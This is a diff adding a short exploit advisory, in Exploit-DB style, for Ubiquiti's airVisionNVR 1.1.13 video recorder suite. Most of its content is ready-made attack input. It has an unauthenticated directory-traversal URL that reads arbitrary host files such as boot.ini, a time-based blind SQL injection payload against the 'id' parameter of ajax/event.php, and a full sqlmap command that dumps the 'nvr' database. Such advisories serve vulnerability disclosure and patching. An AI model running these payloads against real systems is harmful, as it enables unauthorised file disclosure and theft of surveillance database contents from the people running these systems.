@@ -1,0 +1,18 @@
+Exploit Title: airVisionNVR readfile() disclosure and sql injection
+Google Dork: 
+Date: Oct 13, 2012
+Exploit Author: pennyGrit
+Vendor Homepage: http://www.ubnt.com/
+Software Link: http://www.ubnt.com/downloads/airvision/airVision-v1.1.3-installer.exe
+Version: 1.1.13
+Tested on: WinXP SP3
+CVE: Possibly related to CVE-2008-1381 and/or CVE-2008-3880
+
+Overview: The airvision NVR program is an xampp-like suite that allows a regular PC to be used as a security NVR for the Ubiquity line of IP cameras. Several programs are installed including apache, PHP, mysql and a modified version of zoneminder. Ubiquity publishes install packages for both Windows and Ubuntu however only the Windows version was tested below.
+
+* php readfile() local file discolsure: Unauthenticated users can review the contents of anyfile on the host machine using a browser:
+http://192.168.56.101:7079/index.php?view=file&path=../../../../../../boot.ini
+
+* sql AND/OR time-based blind injection: The 'id' parameter in ajax/event.php is vulnerable to a time based sql injection. Complete enumeration of the mysql 'nvr' database is possible.
+Payload: request=event&action=video&eids=1&videoFormat=1&rate=1&scale=1&id=1 AND 3044=BENCHMARK(5000000,MD5(0x67714e77))
+using sqlmap: python sqlmap.py --dbms=mysql -u "http://192.168.56.101:7079/index.php?request=event&action=video&eids=1&videoFormat=1&rate=1&scale=1&id=1" -p id --level 3 --risk 3 --technique T --dump
